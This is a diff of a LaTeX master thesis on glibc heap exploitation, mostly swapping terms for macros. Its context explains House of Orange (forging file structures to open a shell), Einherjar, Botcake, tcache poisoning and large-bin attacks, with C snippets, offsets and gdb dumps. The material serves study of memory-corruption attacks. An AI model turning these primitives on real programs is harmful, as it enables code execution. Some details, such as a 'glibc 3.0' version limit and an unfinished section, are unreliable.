 victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
  \end{lstlisting}
@@ -1111,7 +1113,7 @@ After that, we need to abuse the vulnerability in a way the bck pointer of the v
   \makebox[\textwidth][c]{\includegraphics[height=0.3\textwidth]{gdb3}}
   \caption{Heap layout}
 \end{figure}
-take into consideration the victim is not in the unsorted bin anymore, instead, the heap manager moves it to the small bin after allocation of p2. As you remember we mentioned, the heap manager checks all of the chunks inside the unsorted bin, if the size is not suitable for current allocation they move to the corresponding bin. In other words, we force the heap manager to move the victim from the unsorted bin to the small bin.
+take into consideration the victim is not in the \ub{} anymore, instead, the heap manager moves it to the \sbs{} after allocation of p2. As you remember we mentioned, the heap manager checks all of the chunks inside the \ub{}, if the size is not suitable for current allocation they move to the corresponding bin. In other words, we force the heap manager to move the victim from the \ub{} to the \sbs{}.
 
 \begin{lstlisting}[language=c,frame=tlrb]
 void *p3 = malloc(0x100);
@@ -1123,7 +1125,7 @@ char *p4 = malloc(0x100);
   \caption{Heap layout}
 \end{figure}
 
-Now we overwrite the victim bck pointer also put the victim in the small bin. The next allocation returns the victim from the small bin, moreover, it out bck pointer of the bin in libc to our controller address which is written in the bck pointer of the victim.
+Now we overwrite the victim bck pointer also put the victim in the \sbs{}. The next allocation returns the victim from the \sbs{}, moreover, it out bck pointer of the bin in libc to our controller address which is written in the bck pointer of the victim.
 
 \begin{lstlisting}[language=c,frame=tlrb]
 bin = bin_at (av, idx);
@@ -1158,9 +1160,9 @@ The result of such an action is, our fake chunk is at the top of the bin, so, th
 
 \subsection{The House of Orange}
 
-The house of Orange is different from previous attacks. As you remember in the previous attack we use malloc and free to abuse libc vulnerability, but, In the house of orange, we don’t use the free() function at all. In other words, we force the heap manager to free a chunk of the heap without calling the free() function. The final layout of this attack is a combination of unsorted bin attacks, also, in the end, we gain shell access.
+The house of Orange is different from previous attacks. As you remember in the previous attack we use malloc and free to abuse libc vulnerability, but, In the house of orange, we don’t use the free() function at all. In other words, we force the heap manager to free a chunk of the heap without calling the free() function. The final layout of this attack is a combination of \ub{} attacks, also, in the end, we gain shell access.
 
-At the first, there is one chunk in the application which is called the top chunk with the size of 0x21000. The top chunk becomes smaller after allocation, As we mentioned before when a request has arrived, the heap manager first checks the bins, if there is no suitable chunk in the bins then, the heap manager tries to create a new chunk from the top chunk, so, what’s happen if the requested chunk size is bigger than top chunk too? There are two scenarios for such a situation: if the requested size is smaller than 0x21000, then extend the top chunk, otherwise, use mmap. If we can make the heap manager extend instead of mmap, then, the old top chunk is inserted into an unsorted bin without calling the free function.
+At the first, there is one chunk in the application which is called the top chunk with the size of 0x21000. The top chunk becomes smaller after allocation, As we mentioned before when a request has arrived, the heap manager first checks the bins, if there is no suitable chunk in the bins then, the heap manager tries to create a new chunk from the top chunk, so, what’s happen if the requested chunk size is bigger than top chunk too? There are two scenarios for such a situation: if the requested size is smaller than 0x21000, then extend the top chunk, otherwise, use mmap. If we can make the heap manager extend instead of mmap, then, the old top chunk is inserted into an \ub{} without calling the free function.
 
 To achieve this, we have to meet some security conditions. There is a check for the top chunk inside the libc. 
 \begin{lstlisting}[language=c,frame=tlrb]
@@ -1188,9 +1190,9 @@ top = (size_t *) ( (char *) p1 + 0x400 - 16);
 top[1] = 0xc01;
 p2= malloc(0x1000); 
 \end{lstlisting}
-Now, we have to change the top chunk size in a way to meet security checks. By set 0xc00 + Prev\_flag, we can bypass the security check. At least, we request a chunk larger than the top chunk size. In this situation, the heap manager creates a new top chunk where the old one has ended, then calls the free function to free the old top chunk, so, the old one moves to an unsorted bin. 
+Now, we have to change the top chunk size in a way to meet security checks. By set 0xc00 + Prev\_flag, we can bypass the security check. At least, we request a chunk larger than the top chunk size. In this situation, the heap manager creates a new top chunk where the old one has ended, then calls the free function to free the old top chunk, so, the old one moves to an \ub{}. 
 
-The first part of the attack finished, now, It's time to talk about Glibc file structure and abort routine before continuing to the second phase. What's happen if Glibc detected corruption inside the heap structure? When libc detects any memory corruption, it call the Abort routing automatically. Abort routine flush all file pointers in memory by calling \_IO\_flush\_all\_lockp. Consider a part of code : 
+The first part of the attack finished, now, It's time to talk about \libc{} file structure and abort routine before continuing to the second phase. What's happen if \libc{} detected corruption inside the heap structure? When libc detects any memory corruption, it call the Abort routing automatically. Abort routine flush all file pointers in memory by calling \_IO\_flush\_all\_lockp. Consider a part of code : 
 \begin{lstlisting}[language=c,frame=tlrb]
 struct _IO_FILE *fp;
 fp = (_IO_FILE *) _IO_list_all;
@@ -1204,7 +1206,7 @@ while (fp != NULL)
 	  )
 	 && _IO_OVERFLOW (fp, EOF) == EOF)
 \end{lstlisting}
-As you can see, libc keeps file pointers inside \_io\_list\_all, so, in the corruption situation, all pointers be flush by the use of the io\_file object. When libc allocate a new file structure and fopen() return the pointer, the actual internal structure inside the Glibc is io\_file\_plus , if we take a look at Glibc code we have :
+As you can see, libc keeps file pointers inside \_io\_list\_all, so, in the corruption situation, all pointers be flush by the use of the io\_file object. When libc allocate a new file structure and fopen() return the pointer, the actual internal structure inside the \libc{} is io\_file\_plus , if we take a look at \libc{} code we have :
 \begin{lstlisting}[language=c,frame=tlrb]
 struct _IO_FILE_plus
 {
@@ -1217,9 +1219,9 @@ As you can see this internal structure keeps \_io\_file object alongside a jump 
 
 Our goal is to make \_IO\_flush\_all\_lockp call \_IO\_OVERFLOW, also, overwrite \_io\_list\_all with a forged file pointer in a way \_IO\_OVERFLOW point to system function. The result of this action is to open a shell.
 
-To achieve this, the first thing is to calculate the address of \_io\_list\_all inside the libc. Currently, we have one freed chunk inside the unsorted bin, the bk and fd pointer are pointed to the main arena of the heap, so, we can use this address to calculate the \_io\_list\_all address. 
+To achieve this, the first thing is to calculate the address of \_io\_list\_all inside the libc. Currently, we have one freed chunk inside the \ub{}, the bk and fd pointer are pointed to the main arena of the heap, so, we can use this address to calculate the \_io\_list\_all address. 
 
-With the help of https://libc.blukat.me, we can find the offset of \_io\_list\_all based on the Glibc version. This sample use Glibc-2.23 , so we search inside we site for this specific Glibc version :
+With the help of https://libc.blukat.me, we can find the offset of \_io\_list\_all based on the \libc{} version. This sample use \libc{-2.23} , so we search inside we site for this specific \libc{} version :
 
 \begin{figure}[h!]
   \makebox[\textwidth][c]{\includegraphics[height=0.3\textwidth]{gdb6}}
@@ -1227,7 +1229,7 @@ With the help of https://libc.blukat.me, we can find the offset of \_io\_list\_a
 \end{figure}
 
 
-Now we have the offset of io\_list\_all inside Glibc, in the next step, with the help of vmmap in gdb found the start address of Glibc, then add offset to Glibc address to found io\_list\_all address in the current execution.
+Now we have the offset of io\_list\_all inside \libc{}, in the next step, with the help of vmmap in gdb found the start address of \libc{}, then add offset to \libc{} address to found io\_list\_all address in the current execution.
 \begin{lstlisting}[language=c,frame=tlrb]
 0x00007ffff7a36000 0x00007ffff7bce000 0x0000000000000000 r-x /mnt/vmshare/MasterThesis/libc223/libc.so.6
 0x00007ffff7a36000+0x39c520 = 0x7FFFF7DD2520
@@ -1236,7 +1238,7 @@ Now we have the offset of io\_list\_all inside Glibc, in the next step, with the
 
 
 
-However, this address can’t be calculated in the real-time execution, because we don’t have Glibc address. As we mention the bk and fd pointer of the freed chunk is a point to heap main arena, also, the offset between the main arena and io\_list\_all always is fix, as the result, we can calculate this offset now and use it in real execution 
+However, this address can’t be calculated in the real-time execution, because we don’t have \libc{} address. As we mention the backward and forward pointer of the freed chunk is a point to heap main arena, also, the offset between the main arena and io\_list\_all always is fix, as the result, we can calculate this offset now and use it in real execution 
 \begin{lstlisting}[language=c,frame=tlrb]
 0x7FFFF7DD2520-0x7ffff7dd1b78 = 0x9a8 - > the offset of io_list_all from main arena
 \end{lstlisting}
@@ -1246,7 +1248,7 @@ The final result is the below code :
 io_list_all = top[2] + 0x9a8;
 \end{lstlisting}
 
-For the rest of the attack, we can use an unsorted bin attack. As we mentioned before, in an unsorted bin attack we can overwrite the bk pointer with any address, in this case, we want to overwrite io\_list\_all with the address of the unsorted bin 
+For the rest of the attack, we can use an \ub{} attack. As we mentioned before, in an \ub{} attack we can overwrite the bk pointer with any address, in this case, we want to overwrite io\_list\_all with the address of the \ub{} 
 \begin{lstlisting}[language=c,frame=tlrb]
 top[3] = io_list_all - 0x10;
 \end{lstlisting}
@@ -1258,8 +1260,8 @@ memcpy( ( char *) top, "/bin/sh\x00", 8);
 \end{lstlisting}
 
 
-As we mentioned, the libc flushes all file pointers inside the io\_list\_all link list, which currently overwrites with the address of the unsorted bin. 
-The goal is to gain control of execution with the help of fd pointers. In the real list, the next file pointer is located at base\_address+0x68, if we consider bins, the mentioned address is a small bin[4] which keeps a chunk between 90 to 98. We can conclude, if we manipulate the top chunk size again and set the size of 97, on the next allocation with a smaller size, the heap manager checks chunks in the unsorted bin and puts it into corresponding bins which are smallbin[4]. Also, if we check the source code, we can see this size check : 
+As we mentioned, the libc flushes all file pointers inside the io\_list\_all link list, which currently overwrites with the address of the \ub{}. 
+The goal is to gain control of execution with the help of fd pointers. In the real list, the next file pointer is located at base\_address+0x68, if we consider bins, the mentioned address is a \sbs{}[4] which keeps a chunk between 90 to 98. We can conclude, if we manipulate the top chunk size again and set the size of 97, on the next allocation with a smaller size, the heap manager checks chunks in the \ub{} and puts it into corresponding bins which are smallbin[4]. Also, if we check the source code, we can see this size check : 
 \begin{lstlisting}[language=c,frame=tlrb]
 if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
     || __builtin_expect (victim->size > av->system_mem, 0))
@@ -1268,7 +1270,7 @@ if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
 \end{lstlisting}
 
 
-During iteration over chunks inside the unsorted bin, the libc checks the size of the chunk, if the size smaller than MINSIZE then the abort procedure called and an attack be performed.
+During iteration over chunks inside the \ub{}, the libc checks the size of the chunk, if the size smaller than MINSIZE then the abort procedure called and an attack be performed.
 \begin{lstlisting}[language=c,frame=tlrb]
 top[1] = 0x61;
 \end{lstlisting}
@@ -1292,13 +1294,13 @@ Finally, we trigger the attack by one allocation.
 \end{lstlisting}
 
 \subsection{The House of roman = NOT FINISH YET}
-This attack is a combination of fast bins attack, unsorted bin attack, and Use after the free attack, also, The goal is to open a shell. However, the chance of a successful attack is so small because we need to brute force 12-bit of randomness. The attack consists of three steps.
+This attack is a combination of \fb{} attack, \ub{} attack, and Use after the free attack, also, The goal is to open a shell. However, the chance of a successful attack is so small because we need to brute force 12-bit of randomness. The attack consists of three steps.
 
-The first step is to get a pointer inside malloc\_hook, but, what is the malloc hook? Malloc\_hooc lets you modify the behavior of malloc and free with a hook function. To achieve this we use a fastbin attack in a way the fd pointer points to malloc\_hook.
+The first step is to get a pointer inside malloc\_hook, but, what is the malloc hook? Malloc\_hooc lets you modify the behavior of malloc and free with a hook function. To achieve this we use a \fb{} attack in a way the fd pointer points to malloc\_hook.
 
 \subsection{The House of Rabbit}
 
-This attack used a combination of fast bin and UAF attack to forge a fake heap chunk for feature uses. As we mentioned before, every fast bin keeps a single size chunk with a single linked list. What happens if we change a chunk inside the fastbin? In allocation, fastbin detects the abnormal size and aborts the allocation, however, If we force the heap manager to call malloc to consolidate, this chunk merge and split into small bins, as the result, we have two valid but forged chunks in a small bin which overlap which other. Consider the following code : 
+This attack used a combination of fast bin and UAF attack to forge a fake heap chunk for feature uses. As we mentioned before, every fast bin keeps a single size chunk with a single linked list. What happens if we change a chunk inside the \fb{}? In allocation, \fb{} detects the abnormal size and aborts the allocation, however, If we force the heap manager to call malloc to consolidate, this chunk merge and split into \sbs{}, as the result, we have two valid but forged chunks in a \sbs{} which overlap which other. Consider the following code : 
 \begin{lstlisting}[language=c,frame=tlrb]
 unsigned long *a = malloc(0x40);
 unsigned long *b = malloc(0x40);
@@ -1329,7 +1331,7 @@ Now with a single big allocation we have :
   \caption{LIBC}
 \end{figure}
 
-As you can see now we have two valid forged chunk inside the small bins which have overlap with each other
+As you can see now we have two valid forged chunk inside the \sbs{} which have overlap with each other
 
 \subsection{The House of Einherjar}
 In this attack, the goal is to force malloc to return a chunk in any given address by use of the free function. Consider the free function :
@@ -1342,7 +1344,7 @@ if (!prev_inuse(p)) {
 	unlink (off, p, bck, fwd);
 	} 
  \end{lstlisting}
-When a free function calls, it tries to merge the current chunk with the previous chunk if the prev\_inuse flag is not set. The merged chunk size is calculated by the size of the current chunk and the previous chunk. Before continue we have to mention the basis of the attack. As we mentioned in glibc the metadata at the end of the heap is in share with metadata at the beginning of the next chunk: 
+When a free function calls, it tries to merge the current chunk with the previous chunk if the prev\_inuse flag is not set. The merged chunk size is calculated by the size of the current chunk and the previous chunk. Before continue we have to mention the basis of the attack. As we mentioned in \libc{} the metadata at the end of the heap is in share with metadata at the beginning of the next chunk: 
 \begin{figure}[h!]
   \makebox[\textwidth][c]{\includegraphics[height=0.3\textwidth]{gdb10}}
   \caption{LIBC}
@@ -1356,7 +1358,7 @@ uint8_t* a;
 	int real_a_size = malloc_usable_size(a);
 	size_t fake_chunk[6];
 	fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
-	fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
+	fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the \sbs{}
 	fake_chunk[2] = (size_t) fake_chunk; // fwd
 	fake_chunk[3] = (size_t) fake_chunk; // bck
 	fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
@@ -1386,12 +1388,12 @@ d = malloc(0x200);
 
 
  \subsection{ The House of Botcake}
- The goal is to bypass Glibc security checks in newer versions to perform a tcache double-free attack.
+ The goal is to bypass \libc{} security checks in newer versions to perform a \tch{} double-free attack.
 Consider the following code, like always, first, we assume our target is at the stack 
  \begin{lstlisting}[language=c,frame=tlrb]
 intptr_t stack_var[4];
  \end{lstlisting}
- Now, We allocate 7 chunks to fill up the tcache in the future. As you remember we did this trick before too.
+ Now, We allocate 7 chunks to fill up the \tch{} in the future. As you remember we did this trick before too.
  \begin{lstlisting}[language=c,frame=tlrb]
  intptr_t *x[7];
   for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
@@ -1407,7 +1409,7 @@ intptr_t *a = malloc(0x100);
 malloc(0x10);
 \end{lstlisting}
 
-As we mention, we need to fill up tcache, so , we perform the free function on the 7 chunks, as the result, heap manager force to use the unsorted bin and other bins:
+As we mention, we need to fill up \tch{}, so , we perform the free function on the 7 chunks, as the result, heap manager force to use the \ub{} and other bins:
 
 \begin{lstlisting}[language=c,frame=tlrb]
 for(int i=0; i<7; i++){
@@ -1439,14 +1441,14 @@ Chunk(addr=0x555555559a10, size=0x220, flags=PREV_INUSE)
   \caption{LIBC}
 \end{figure}
 
-In the next step with the help of UAF and double-free attack we put back the victim in the tcach
+In the next step with the help of UAF and double-free attack we put back the victim in the \tch{}
 
 \begin{lstlisting}[language=c,frame=tlrb]
 malloc(0x100);
 free(a);
 \end{lstlisting}
 
-The above procedure has another result too, now we have two chunks that overlap too. For the rest of the attack, we perform a tcach poisoning. First, define a victim and overwrite the fd pointer in a way pointing to the target, then two allocations. The last allocation has control over the target
+The above procedure has another result too, now we have two chunks that overlap too. For the rest of the attack, we perform a \tch{} poisoning. First, define a victim and overwrite the fd pointer in a way pointing to the target, then two allocations. The last allocation has control over the target
 
 \begin{lstlisting}[language=c,frame=tlrb]
 intptr_t *b = malloc(0x120);
@@ -1477,7 +1479,7 @@ Chunk(addr=0x555555559210, size=0x80, flags=)
   [0x0000555555559210   33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33  3333333333333333]
 \end{lstlisting}
 
-Now lets free() the second chunk, As we discuss, This chunk add to the unsorted bin at first, then, It can be used for future allocation :
+Now lets free() the second chunk, As we discuss, This chunk add to the \ub{} at first, then, It can be used for future allocation :
 \begin{lstlisting}[language=c,frame=tlrb]
 free(p2).
 \end{lstlisting}
@@ -1512,7 +1514,7 @@ unsorted_bins[0]: fw=0x555555559100, bk=0x555555559100
   Chunk(addr=0x555555559110, size=0x180, flags=PREV_INUSE)
  \end{lstlisting}
  
-As you remember, currently , p2 located at the unsorted bin , also, we change the size of p2, so, when the heap manager receives an allocation request it return p2, as the result, it have overlap with previous chunks :
+As you remember, currently , p2 located at the \ub{} , also, we change the size of p2, so, when the heap manager receives an allocation request it return p2, as the result, it have overlap with previous chunks :
 \begin{lstlisting}[language=c,frame=tlrb]
 p4 = malloc(evil_region_size);
  \end{lstlisting}
@@ -1566,8 +1568,8 @@ free(mmap_chunk_3);
 
 In this stage if we allocate a new big chunk, this new big chunk is overlap with chunk\_2 which just has been unmmap without call unmmap directly, as the result, we can write on the chunk2 area with the help of our new chunk.
 
-\section{Tcache poisoning}
-This attack is specially designed for tcache bins, As a result, The tcache attack won't work on the older version of libc which does not have tcache. The final goal is to force tcache to return a chunk in a controlled location for example the stack. consider the following code : 
+\section{\tch{} poisoning}
+This attack is specially designed for \tch{} bins, As a result, The \tch{} attack won't work on the older version of libc which does not have \tch{}. The final goal is to force \tch{} to return a chunk in a controlled location for example the stack. consider the following code : 
 \begin{lstlisting}[language=c,frame=tlrb]
 size_t stack_var;
 intptr_t *a = malloc(128);
@@ -1579,7 +1581,7 @@ free(b);
 \begin{lstlisting}[language=c,frame=tlrb]
 Tcachebins[idx=7, size=0x90] count=2  Chunk(addr=0x555555559330, size=0x90, flags=PREV_INUSE)  Chunk(addr=0x5555555592a0, size=0x90, flags=PREV_INUSE) 
 \end{lstlisting}
-The controller location in this sample is a variable inside the stack. In the next step, we allocate and free two chunks. In newer versions of Glibc, this chunk could be added to tcache.
+The controller location in this sample is a variable inside the stack. In the next step, we allocate and free two chunks. In newer versions of \libc{}, this chunk could be added to \tch{}.
 In the second step we overwrite the fd pointer of chunk ‘b’ :
 \begin{lstlisting}[language=c,frame=tlrb]
 b[0] = (intptr_t)&stack_var;
@@ -1589,18 +1591,18 @@ b[0] = (intptr_t)&stack_var;
 Tcachebins[idx=7, size=0x90] count=2  Chunk(addr=0x555555559330, size=0x90, flags=PREV_INUSE)  Chunk(addr=0x7fffffffde68, size=0x7ffff7fc7fc8, flags=)  Chunk(addr=0x555555555410, size=0x9066c3c9fffffcc0, flags=NON_MAIN_ARENA)  [Corrupted chunk at 0x8d4c5741fa1e0ff3]
 \end{lstlisting}
 
-Now, as you can see in the final layout of tcache , the previous chunk is not valid anymore , it is a controller located in the stack:
+Now, as you can see in the final layout of \tch{} , the previous chunk is not valid anymore , it is a controller located in the stack:
 \begin{lstlisting}[language=c,frame=tlrb]
 [ 0x555555559330 -> 0x7fffffffdee8 ]
 \end{lstlisting}
-In the final step with one allocation , we can remove top chunk from the tcache , so , the next allocation return our controller location (the size must be the same): 
+In the final step with one allocation , we can remove top chunk from the \tch{} , so , the next allocation return our controller location (the size must be the same): 
 \begin{lstlisting}[language=c,frame=tlrb]
 malloc(128)
 intptr_t *c = malloc(128);
 \end{lstlisting}
 
-\section{Large bin Attack}
-As the name suggests, this attack is about the Large bins. The goal is to force a large bin to write data in a controlled location.
+\section{\lb{} Attack}
+As the name suggests, this attack is about the \lb{}. The goal is to force a \lb{} to write data in a controlled location.
 \begin{lstlisting}[language=c,frame=tlrb]
 size_t target = 0;
 size_t *p1 = malloc(0x428);
@@ -1608,16 +1610,16 @@ size_t *g1 = malloc(0x18);
 size_t *p2 = malloc(0x418);
 size_t *g2 = malloc(0x18);
 \end{lstlisting}
-The first step is to define the target, also, we need to define two chunks in the range size of large bins, moreover, we need to define two chunks between them to prevent them from merging or the top chunk. 
+The first step is to define the target, also, we need to define two chunks in the range size of \lb{}, moreover, we need to define two chunks between them to prevent them from merging or the top chunk. 
 \begin{lstlisting}[language=c,frame=tlrb]
 free(p1);
 size_t *g3 = malloc(0x438);
 \end{lstlisting}
-In the second step, we free the biggest chunk, however, the freed chunk is not in the large bin yet. As we discussed, the freed chunk was added to unsorted bins at first, so, The best way to move it into the large bin is to allocate a new bigger chunk. In this way, the heap manager checks the chunk inside the unsorted bin, then adds them into the corresponding bins (Like other attacks).
+In the second step, we free the biggest chunk, however, the freed chunk is not in the \lb{} yet. As we discussed, the freed chunk was added to \ub{} at first, so, The best way to move it into the \lb{} is to allocate a new bigger chunk. In this way, the heap manager checks the chunk inside the \ub{}, then adds them into the corresponding bins (Like other attacks).
 \begin{lstlisting}[language=c,frame=tlrb]
 free(p2);
 \end{lstlisting}
-In the third step, we freed the smaller chunk. Now we have one chunk inside the large bin and one chunk in the unsorted bin.
+In the third step, we freed the smaller chunk. Now we have one chunk inside the \lb{} and one chunk in the \ub{}.
 \begin{lstlisting}[language=c,frame=tlrb]
 [+] unsorted_bins[0]: fw=0x5555555596e0, bk=0x5555555596e0
   Chunk(addr=0x5555555596f0, size=0x420, flags=PREV_INUSE)
@@ -1626,12 +1628,12 @@ In the third step, we freed the smaller chunk. Now we have one chunk inside the 
   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE)
 \end{lstlisting}
 
-The next step is to put the target address - 0x20 in the p1->bk\_nextsize . As we mentioned before, Just large bins chunk chunks use this pointer, they point to the next biggest chunk in the link list. 
+The next step is to put the target address - 0x20 in the p1->bk\_nextsize . As we mentioned before, Just \lb{} chunk chunks use this pointer, they point to the next biggest chunk in the link list. 
 \begin{lstlisting}[language=c,frame=tlrb]
 p1[3] = (size_t)((&target)-4);
 size_t *g4 = malloc(0x438);
 \end{lstlisting}
-The last step is to allocate a bigger chunk , so , p2 move to a larger chunk . When p2 move to large chunk , the heap manager write the address of p2 inside p1->bk\_nextsize->fd\_nextsize as the code of glibc show:
+The last step is to allocate a bigger chunk , so , p2 move to a larger chunk . When p2 move to large chunk , the heap manager write the address of p2 inside p1->bk\_nextsize->fd\_nextsize as the code of \libc{} show:
 \begin{lstlisting}[language=c,frame=tlrb]
 fwd = bck;
 bck = bck->bk;
@@ -1639,7 +1641,7 @@ victim->fd_nextsize = fwd->fd;
 victim->bk_nextsize = fwd->fd->bk_nextsize;
 fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
 \end{lstlisting}
-This attack works on glibc below 3.0 .
+This attack works on \libc{} below 3.0 .
 \chapter{Conclusion}
 
 \bibliographystyle{alphaurl}
